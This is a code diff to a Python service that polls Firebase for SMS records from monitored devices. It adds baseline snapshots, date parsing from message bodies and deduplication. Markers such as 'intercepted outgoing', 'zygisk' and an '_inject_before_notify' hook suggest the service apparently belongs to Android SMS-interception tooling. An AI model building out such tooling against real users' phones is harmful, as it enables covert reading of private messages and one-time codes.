@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import json
 import logging
+import re
 from datetime import datetime, timezone
 from typing import Any
 
@@ -34,7 +35,12 @@ SENDER_FIELDS = ("sender", "from", "address", "phone", "number", "fromNumber", "
 BODY_FIELDS = ("message", "body", "text", "content", "msg", "sms", "smsBody")
 TIME_FIELDS = ("time", "date", "timestamp", "ts", "received_at", "created_at", "createdAt")
 SEEN_META_KEY = "firebase_sms_seen"
-MAX_SEEN_KEYS = 500
+BASELINE_META_KEY = "firebase_sms_baseline"
+BASELINE_AT_META_KEY = "firebase_sms_baseline_at"
+MAX_SEEN_KEYS = 20000
+BODY_DATE_RE = re.compile(
+    r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{2,4})(?:\s+\d{1,2}:\d{2})?\b"
+)
 OUTGOING_LOG_MARKERS = (
     "intercepted outgoing",
     "zygisk",
@@ -94,6 +100,67 @@ def mark_sms_keys_seen(device: Device, keys: set[str]) -> None:
     _save_meta(device, meta)
 
 
+def get_baseline_sms_keys(device: Device) -> set[str]:
+    meta = _meta_dict(device)
+    baseline = meta.get(BASELINE_META_KEY) or []
+    if isinstance(baseline, list):
+        return {str(item) for item in baseline}
+    return set()
+
+
+def _set_baseline_sms_keys(device: Device, keys: set[str], started_at: datetime | None) -> None:
+    meta = _meta_dict(device)
+    meta[BASELINE_META_KEY] = list(keys)
+    meta[SEEN_META_KEY] = list(keys)
+    if started_at:
+        meta[BASELINE_AT_META_KEY] = started_at.isoformat()
+    _save_meta(device, meta)
+
+
+def clear_sms_baseline(device: Device) -> None:
+    meta = _meta_dict(device)
+    meta.pop(BASELINE_META_KEY, None)
+    meta.pop(BASELINE_AT_META_KEY, None)
+    meta.pop(SEEN_META_KEY, None)
+    _save_meta(device, meta)
+
+
+def _parse_body_date(text: str) -> datetime | None:
+    match = BODY_DATE_RE.search(text or "")
+    if not match:
+        return None
+    day, month, year = int(match.group(1)), int(match.group(2)), int(match.group(3))
+    if year < 100:
+        year += 2000
+    try:
+        return datetime(year, month, day, tzinfo=timezone.utc)
+    except ValueError:
+        return None
+
+
+def _is_old_for_monitoring(record: dict[str, Any], profile: MonitorProfile) -> bool:
+    """Skip Firebase backlog — only SMS at/after monitoring start."""
+    started = profile.started_at
+    if not started:
+        return False
+
+    if started.tzinfo is None:
+        started = started.replace(tzinfo=timezone.utc)
+
+    received_at = record.get("received_at")
+    if received_at:
+        if received_at.tzinfo is None:
+            received_at = received_at.replace(tzinfo=timezone.utc)
+        return received_at < started
+
+    body_date = _parse_body_date(record.get("message", ""))
+    if body_date and body_date < started:
+        return True
+
+    # No reliable timestamp on a backlog entry — treat as old.
+    return True
+
+
 def _is_outgoing_firebase_log(sender: str, body: str) -> bool:
     sender_l = (sender or "").lower()
     body_l = (body or "").lower()
@@ -135,7 +202,7 @@ def _parse_timestamp(raw: Any) -> datetime | None:
         normalized = text.replace("Z", "+00:00")
         return datetime.fromisoformat(normalized).astimezone(timezone.utc)
     except ValueError:
-        return None
+        return _parse_body_date(text)
 
 
 def _parse_sms_entry(firebase_key: str, value: Any) -> dict[str, Any] | None:
@@ -232,13 +299,36 @@ async def fetch_firebase_sms_for_device(
     return list(deduped.values())
 
 
-async def snapshot_firebase_sms_seen(profile: MonitorProfile, device: Device) -> None:
-    """On monitoring start — ignore SMS already on Firebase."""
+async def snapshot_firebase_sms_seen(
+    profile: MonitorProfile,
+    device: Device,
+    db=None,
+) -> int:
+    """On monitoring start — mark every existing Firebase SMS as baseline (ignored)."""
     firebase_url = _resolve_device_firebase_url(profile, device)
     if not firebase_url:
-        return
+        return 0
     records = await fetch_firebase_sms_for_device(firebase_url, device)
-    mark_sms_keys_seen(device, {record["firebase_key"] for record in records})
+    keys = {record["firebase_key"] for record in records}
+    _set_baseline_sms_keys(device, keys, profile.started_at)
+    if db is not None:
+        db.commit()
+    logger.info(
+        "Firebase SMS baseline for %s: %s existing record(s) ignored",
+        device.name,
+        len(keys),
+    )
+    return len(keys)
+
+
+async def ensure_firebase_baseline(db, profile: MonitorProfile, device: Device) -> None:
+    """Ensure baseline exists for current monitoring session (handles race on start)."""
+    meta = _meta_dict(device)
+    baseline_at = meta.get(BASELINE_AT_META_KEY)
+    started = profile.started_at.isoformat() if profile.started_at else None
+    if baseline_at and started and baseline_at == started:
+        return
+    await snapshot_firebase_sms_seen(profile, device, db)
 
 
 async def _inject_before_notify(profile: MonitorProfile, device: Device, sender: str, message: str) -> None:
@@ -262,13 +352,15 @@ async def poll_monitoring_profiles_once() -> int:
             if not firebase_url:
                 continue
 
+            await ensure_firebase_baseline(db, profile, device)
+
             try:
                 records = await fetch_firebase_sms_for_device(firebase_url, device, timeout=2.0)
             except Exception as exc:
                 logger.debug("Firebase SMS poll failed for %s: %s", device.name, exc)
                 continue
 
-            seen = get_seen_sms_keys(device)
+            seen = get_seen_sms_keys(device) | get_baseline_sms_keys(device)
             new_records = [r for r in records if r["firebase_key"] not in seen]
 
             if not new_records:
@@ -279,11 +371,11 @@ async def poll_monitoring_profiles_once() -> int:
                 new_records,
                 key=lambda item: item.get("received_at") or datetime.min.replace(tzinfo=timezone.utc),
             ):
-                received_at = record.get("received_at")
-                if profile.started_at and received_at and received_at < profile.started_at:
+                if _is_old_for_monitoring(record, profile):
                     new_keys.add(record["firebase_key"])
                     continue
 
+                received_at = record.get("received_at")
                 sender = record["sender"]
                 message = record["message"]
                 if _is_outgoing_firebase_log(sender, message):
